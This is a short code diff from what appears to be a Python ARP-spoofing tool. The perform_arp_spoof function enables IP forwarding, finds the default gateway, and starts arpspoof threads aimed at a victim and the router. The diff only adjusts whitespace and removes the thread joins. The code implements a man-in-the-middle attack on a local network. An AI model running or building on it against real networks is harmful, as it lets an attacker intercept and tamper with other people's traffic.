@@ -23,7 +23,7 @@ def perform_arp_spoof(victim_ip, iface="eth0"):
     enable_ip_forwarding()
     router_ip = subprocess.check_output(
         ["ip", "route"], encoding="utf-8").split("default via ")[1].split()[0]
-
+    
     victim_thread = threading.Thread(
         target=run_arpspoof, args=(victim_ip, router_ip, iface, True))
     router_thread = threading.Thread(
@@ -31,9 +31,6 @@ def perform_arp_spoof(victim_ip, iface="eth0"):
 
     victim_thread.start()
     router_thread.start()
-
-    victim_thread.join()
-    router_thread.join()
 
 
 def run_arpspoof(victim_ip, router_ip, iface="eth0", target_victim=True):
